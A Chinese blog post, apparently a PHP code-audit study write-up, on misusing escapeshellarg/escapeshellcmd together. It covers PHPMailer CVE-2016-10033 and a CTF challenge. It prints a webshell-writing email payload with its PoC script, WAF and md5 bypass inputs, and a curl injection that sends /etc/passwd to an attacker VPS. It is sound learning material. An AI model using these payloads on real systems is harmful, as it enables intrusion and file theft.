@@ -1,0 +1,289 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>php代码审计-函数篇_Day5 - xiaofeiji&#39;s Blog</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Xiaofeiji,"> 
+    <meta name="description" content="escapeshellarg与escapeshellcmd使用不当关于函数mail()函数：
+
+12345678910111213to电子邮件收件人，或收件人列表。subject电子邮件的主题。me,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="xiaofeiji&#39;s Blog" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.jpg"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+   <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+   </script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body class="loading">
+    <span id="config-title" style="display:none">xiaofeiji&#39;s Blog</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">php代码审计-函数篇_Day5</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">php代码审计-函数篇_Day5</h1>
+        <div class="stuff">
+            <span>二月 20, 2022</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%85%B3%E4%BA%8E%E5%87%BD%E6%95%B0/" rel="tag">代码审计-关于函数</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h3 id="escapeshellarg与escapeshellcmd使用不当"><a href="#escapeshellarg与escapeshellcmd使用不当" class="headerlink" title="escapeshellarg与escapeshellcmd使用不当"></a>escapeshellarg与escapeshellcmd使用不当</h3><h4 id="关于函数"><a href="#关于函数" class="headerlink" title="关于函数"></a>关于函数</h4><p>mail()函数：</p>
+<p><img src="clipboard.png" alt="img"></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">to</span><br><span class="line">电子邮件收件人，或收件人列表。</span><br><span class="line"></span><br><span class="line">subject</span><br><span class="line">电子邮件的主题。</span><br><span class="line"></span><br><span class="line">message</span><br><span class="line">所要发送的消息。</span><br><span class="line"></span><br><span class="line">additional_headers（可选项）</span><br><span class="line">要插入在电子邮件标题末尾的字符串。</span><br><span class="line"></span><br><span class="line">additional_parameters，指定传递给发送程序sendmail的额外参数。</span><br></pre></td></tr></table></figure>
+
+
+
+<p>在Linux系统上， php 的 mail 函数在底层中已经写好了，默认调用 Linux 的 <a target="_blank" rel="noopener" href="http://www.sendmail.com/">sendmail</a> 程序发送邮件。而在额外参数( additional_parameters )中， sendmail 主要支持的选项有以下三种：</p>
+<ul>
+<li>-O option = value</li>
+</ul>
+<p>QueueDirectory = queuedir 选择队列消息</p>
+<ul>
+<li>-X logfile</li>
+</ul>
+<p>这个参数可以指定一个目录来记录发送邮件时的详细日志情况。</p>
+<ul>
+<li>-f from email</li>
+</ul>
+<p>这个参数可以让我们指定我们发送邮件的邮箱地址。</p>
+<hr>
+<p><img src="clipboard-1645370692533.png" alt="img"></p>
+<p><strong>escapeshellarg()</strong> 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号</p>
+<p>会将字符串中含有的单引号加上反斜杠进行转义，并将单引号前后分成两个部分，分别使用单引号括起来。</p>
+<p><img src="clipboard-1645370705452.png" alt="img"></p>
+<p>反斜线（\）会在以下字符之前插入： &amp;#;`|*?~&lt;&gt;^()[]{}$, \x0A 和 \xFF。 ‘ 和 “ 仅在不配对儿的时候被转义。</p>
+<p><strong>escapeshellcmd()在单引号或双引号落单的时候将落单的单（双）引号加反斜杠进行转义。</strong></p>
+<p>eg:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">传递参数：</span><br><span class="line">127.0.0.1&#x27; -v -d a=1</span><br><span class="line">经过escapeshellarg() ，</span><br><span class="line">&#x27;127.0.0.1&#x27;\&#x27; &#x27;-v -d a=1&#x27;</span><br><span class="line">再经过escapeshellcmd()：会将落单的单引号加上反斜杠进行转义：</span><br><span class="line">&#x27;127.0.0.1&#x27;\\&#x27; &#x27;-v -d a=1\&#x27;</span><br><span class="line">最终字符串被分隔为&#x27;127.0.0.1&#x27;\    &#x27; &#x27;     -v -d a=1\&#x27;</span><br><span class="line">这是因为反斜杠前面加了转义的反斜杠之后表示的就是它本身了。</span><br><span class="line">如果是传入curl执行命令，那么就会成功执行curl 127.0.0.1\</span><br><span class="line">即像127.0.0.1\发起请求，post请求的数据是a=1\&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><strong>PHPMailer 命令执行漏洞</strong>：CVE-2016-10033</p>
+<p>下载源码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/PHPMailer/PHPMailer</span><br><span class="line">cd PHPMailer</span><br><span class="line">git checkout -b CVE-2016-10033 v5.2.17</span><br><span class="line"></span><br><span class="line">git checkout  -b  分支名   表示以当前分支的当前状态创建新分支并切换到新分支    -b 表示创建新分支，将代码版本切换到5.2.17。</span><br></pre></td></tr></table></figure>
+
+<p>phpMailer 是一个非常强大的 php发送邮件类,可以设定发送邮件地址、回复地址、邮件主题、html网页,上传附件,并且使用起来非常方便。</p>
+<p>class.phpmailer.php中，697行，如果存在$params参数的话，就执行else语句，调用mail函数传入5个参数。</p>
+<p><img src="clipboard-1645371293923.png" alt="img"></p>
+<p>追踪参数的来源：在同文件下的1445行，可以看到$params是经过$this-&gt;Sender传进来的，再追踪$this-&gt;Sender参数的来源：</p>
+<p><img src="clipboard-1645371302233.png" alt="img"></p>
+<p>在同文件下的1031行，$this-&gt;Sender参数由$address参数赋值而来，$address参数经过validateAddress()函数过滤，我们再跟进查看该函数的用法：</p>
+<p><img src="clipboard-1645371309977.png" alt="img"></p>
+<p> validateAddress()函数在同文件下的1068行，往下看可以看到下面的代码是对PHP的版本以及pcre版本和有无进行判断。</p>
+<p>如果PCRE的版本大于等于8.0.3，$patternselect参数为pcre8，否则该参数为pcre，如果不存在pcre并且php的版本小于等于5.2.0的话，该参数赋值为noregex，我们找一下noregex的来源：</p>
+<p><img src="clipboard-1645371318751.png" alt="img"></p>
+<p>在往下的一段代码中，有针对该参数的switch判断，</p>
+<p><img src="clipboard-1645371327742.png" alt="img"></p>
+<p>1147行，找到noregex选项，这里对$address的判断是使用@符号进行分割判断的。没有其他的任何过滤。</p>
+<p><img src="clipboard-1645371335760.png" alt="img"></p>
+<p>但是一般情况下现在很少是没有正则匹配的了，并且PCRE的版本都在8及以上，如果这里想要绕过pcre8，那么就需要绕过这一段的正则匹配，但是我还看不太懂，这里我就先不分析了。</p>
+<p><img src="clipboard-1645371345682.png" alt="img"></p>
+<p>绕过这段正则匹配的payload构造：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa( -X/home/www/success.php )@qq.com</span><br></pre></td></tr></table></figure>
+
+
+
+<p>以下是一段p神文章中的测试代码，我加了一点自己的备注：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//测试代码</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;PHPMailer/PHPMailerAutoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">send</span>(<span class="params"><span class="variable">$from</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$mail</span> = <span class="keyword">new</span> PHPMailer;   <span class="comment">//实例化</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$mail</span>-&gt;setFrom(<span class="variable">$from</span>);   <span class="comment">//发件人</span></span><br><span class="line">    <span class="variable">$mail</span>-&gt;addAddress(<span class="string">&#x27;joe@example.net&#x27;</span>, <span class="string">&#x27;Joe User&#x27;</span>);     <span class="comment">// Add a recipient   收件人</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$mail</span>-&gt;isHTML(<span class="literal">true</span>);                                  <span class="comment">// Set email format to HTML   是否以HTML文档格式发送  发送后客户端可直接显示对应的HTML内容</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$mail</span>-&gt;Subject = <span class="string">&#x27;&lt;?php phpinfo(); ?&gt;&#x27;</span>;   <span class="comment">//邮件的标题</span></span><br><span class="line">    <span class="variable">$mail</span>-&gt;Body    = <span class="string">&#x27;This is the HTML message body &lt;b&gt;in bold!&lt;/b&gt;&#x27;</span>;     <span class="comment">//邮件内容</span></span><br><span class="line">    <span class="variable">$mail</span>-&gt;AltBody = <span class="string">&#x27;This is the body in plain text for non-HTML mail clients&#x27;</span>;   <span class="comment">//如果邮件客户端不支持HTML则显示此内容</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$mail</span>-&gt;send()) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Message could not be sent.&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Mailer Error: &#x27;</span> . <span class="variable">$mail</span>-&gt;ErrorInfo;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Message has been sent&#x27;</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$mail</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$address</span> = <span class="string">&quot;aaa( -X/home/www/success.php )@qq.com&quot;</span>;</span><br><span class="line"></span><br><span class="line">send(<span class="variable">$address</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>通过上述代码就能成功将<?php phpinfo();?>传入到success.php文件中，造成命令执行。</p>
+<p>在新增的补丁中，针对用户输入使用 escapeshellarg 函数进行处理：</p>
+<p><img src="clipboard-1645371407366.png" alt="img"></p>
+<p> 而mail 函数底层实现中调用的 escapeshellcmd() 函数处理字符串。</p>
+<p>escapeshellarg()和escapeshellcmd()的连用导致单引号逃逸，又会造成命令执行的漏洞。</p>
+<p>payload要改为：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa&#x27;( -X/home/www/success.php )@qq.com</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/PHPMailer-CVE-2016-10033.html">https://www.leavesongs.com/PENETRATION/PHPMailer-CVE-2016-10033.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/161/">https://paper.seebug.org/161/</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day5/files/README.md">https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day5/files/README.md</a></p>
+<h3 id="ctf题目"><a href="#ctf题目" class="headerlink" title="ctf题目"></a>ctf题目</h3><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/flag/i&#x27;</span>,<span class="variable">$key</span>))&#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;are you a hacker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">&#x27;_POST&#x27;</span>, <span class="string">&#x27;_GET&#x27;</span>, <span class="string">&#x27;_COOKIE&#x27;</span>) <span class="keyword">as</span> <span class="variable">$__R</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$$__R</span>) &#123; </span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$$__R</span> <span class="keyword">as</span> <span class="variable">$__k</span> =&gt; <span class="variable">$__v</span>) &#123; </span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$$__k</span>) &amp;&amp; <span class="variable">$$__k</span> == <span class="variable">$__v</span>) <span class="keyword">unset</span>(<span class="variable">$$__k</span>); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>) &#123; waf(<span class="variable">$_POST</span>);&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>) &#123; waf(<span class="variable">$_GET</span>); &#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_COOKIE</span>) &#123; waf(<span class="variable">$_COOKIE</span>);&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>) extract(<span class="variable">$_POST</span>, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>) extract(<span class="variable">$_GET</span>, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$_GET</span>[<span class="string">&#x27;hongri&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(md5(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] ) == md5(<span class="variable">$_GET</span>[<span class="string">&#x27;hongri&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">        <span class="variable">$urlInfo</span> = parse_url(<span class="variable">$url</span>);</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="string">&quot;http&quot;</span> === strtolower(<span class="variable">$urlInfo</span>[<span class="string">&quot;scheme&quot;</span>]) || <span class="string">&quot;https&quot;</span>===strtolower(<span class="variable">$urlInfo</span>[<span class="string">&quot;scheme&quot;</span>])))&#123;</span><br><span class="line">            <span class="keyword">die</span>( <span class="string">&quot;scheme error!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$url</span> = escapeshellarg(<span class="variable">$url</span>);</span><br><span class="line">        <span class="variable">$url</span> = escapeshellcmd(<span class="variable">$url</span>);</span><br><span class="line">        system(<span class="string">&quot;curl &quot;</span>.<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"> <span class="comment">// flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;HRCTF&#123;Are_y0u_maz1ng&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>一开始是一个waf函数的过滤，将变量名中的flag过滤掉。</p>
+<p><img src="clipboard-1645371476603.png" alt="img"></p>
+<p>但是在后面的利用中，需要传入flag变量，再往上看到有一段变量覆盖的地方：</p>
+<p><img src="clipboard-1645371488087.png" alt="img"></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">首先是一个遍历数组，如果存在$$__R的话，再遍历$$__R的值，将其变量名赋值给$__k，将其内容值赋值给$__v。然后判断$$__k和$__v的值是否相等，执行unset，将$$__k变量删除掉。</span><br></pre></td></tr></table></figure>
+
+<p><img src="clipboard-1645371510116.png" alt="img"></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">在这里我们尝试传入值进行分析：</span><br><span class="line">get传入：?flag=QNKCDZO</span><br><span class="line">post提交：_GET[flag]=QNKCDZO</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">然后我们尝试将上面的变量值进行输出来理解代码：</span><br><span class="line">首先$__R接收到的是字段_POST、_GET、_COOKIE，在这里是：$__R: string(5) &quot;_POST&quot; </span><br><span class="line">因此$$__R就是取到$_POST提交的值：$$__R:=&gt;$_POST=&gt;array(1) &#123; [&quot;_GET&quot;]=&gt; array(1) &#123; [&quot;flag&quot;]=&gt; string(7) &quot;QNKCDZO&quot; &#125; &#125; </span><br><span class="line"></span><br><span class="line">由此得到$v和$k的值如下：</span><br><span class="line"></span><br><span class="line">$__k: string(4) &quot;_GET&quot; </span><br><span class="line">$__v: array(1) &#123; [&quot;flag&quot;]=&gt; string(7) &quot;QNKCDZO&quot; &#125;</span><br><span class="line"></span><br><span class="line">而$$__k也就是$_GET[flag]，那么取到的$_GET提交的值也就是array(1) &#123; [&quot;flag&quot;]=&gt; string(7) &quot;QNKCDZO&quot; &#125; ：</span><br><span class="line">$$__k:=&gt;$_GET[flag] =&gt;array(1) &#123; [&quot;flag&quot;]=&gt; string(7) &quot;QNKCDZO&quot; &#125;  (获取get传参过来的值，也就是QNKCDZO)</span><br><span class="line"></span><br><span class="line">因此$$__k和$__v的值相等，执行unset将$_GET[flag]这个超全局变量删除掉了。</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="clipboard-1645371543999.png" alt="img"></p>
+<p>因此get传值的超全局变量被unset之后，就无需再进行waf函数的检测。</p>
+<p>在extract函数中，由于post传值为_GET[flag]=QNKCDZO，而EXTR_SKIP参数表示如果有变量冲突，则不会覆盖已有的变量，但是前面的$_GET[flag]已经被unset掉了，因此经过extract函数的处理，就生成了$_GET[flag]变量，值为QNKCDZO，绕过了上方waf函数的检测，从而传入了flag变量。</p>
+<p>这一部分的变量覆盖过程建议手动输出理解。</p>
+<p>因此通过get和post的一起使用传值，使用md5的弱比较类型找到md5后0e开头的值绕过即可，这里就成功绕过了前面第一part的代码。</p>
+<p>下面是第二部分关于escapeshellarg和escapeshellcmd的利用：</p>
+<p>这里的话就是利用共用escapeshellarg/cmd函数时加单引号导致的转义将构造的语句前后分段，从而传入system中结合curl执行命令。</p>
+<p>在 curl 中存在 -F 提交表单的方法，也可以提交文件。 -F &lt;key=value&gt; 向服务器POST表单。提交文件之后，利用代理的方式进行监听，这样就可以截获到文件了：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">http://baidu.com/&#x27; -F file=@/etc/passwd -x  vps:9999，</span><br><span class="line"></span><br><span class="line">然后经过escapeshellarg函数处理变成&#x27;http://baidu.com/&#x27;\&#x27; &#x27;-F file=@/etc/passwd -x  vps:9999&#x27;</span><br><span class="line"></span><br><span class="line">再经过escapeshellcmd之后变成：</span><br><span class="line"></span><br><span class="line">&#x27;http://baidu.com/&#x27;\\&#x27; &#x27;-F file=@/etc/passwd -x  vps:9999\&#x27;</span><br><span class="line"></span><br><span class="line">将该payload分成了三段：</span><br><span class="line"></span><br><span class="line">&#x27;http://baidu.com/&#x27;\\      &#x27; &#x27;     -F file=@/etc/passwd -x  vps:9999\&#x27;</span><br><span class="line"></span><br><span class="line">在服务器打开监听端口9999，就能监听到传过来的文件。</span><br></pre></td></tr></table></figure>
+
+
+
+<p>但是在本机测试代码老出现^这样的奇怪字符，调试了好久也没知道为啥，就没管了，大概的原理就是这样。</p>
+<p><img src="clipboard-1645371565897.png" alt="img"></p>
+<p>wp中有这样一段描述：</p>
+<p><img src="clipboard-1645371600514.png" alt="img"></p>
+<p>这应该也是要注意的问题。</p>
+<h4 id="参考文章-1"><a href="#参考文章-1" class="headerlink" title="参考文章"></a>参考文章</h4><p><a target="_blank" rel="noopener" href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/PHP-Audit-Labs%E9%A2%98%E8%A7%A3/Day5-8/files/README.md">https://github.com/hongriSec/PHP-Audit-Labs/blob/master/PHP-Audit-Labs%E9%A2%98%E8%A7%A3/Day5-8/files/README.md</a></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable=''
+        data-ae=''
+        data-ci=''
+        data-cs=''
+        data-r='xiaofeiji-77.github.io'
+        data-o='xiaofeiji-77'
+        data-a='xiaofeiji-77'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#escapeshellarg%E4%B8%8Eescapeshellcmd%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%BD%93"><span class="toc-number">1.</span> <span class="toc-text">escapeshellarg与escapeshellcmd使用不当</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.</span> <span class="toc-text">关于函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">2.1.</span> <span class="toc-text">参考文章</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ctf%E9%A2%98%E7%9B%AE"><span class="toc-number">3.</span> <span class="toc-text">ctf题目</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0-1"><span class="toc-number">3.1.</span> <span class="toc-text">参考文章</span></a></li></ol></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+   
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+
+
+<!--单击显示文字-->
+<script type="text/javascript" src="/js/click_show_text.js"></script>
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/canvas-nest.min.js"></script>
+</html>
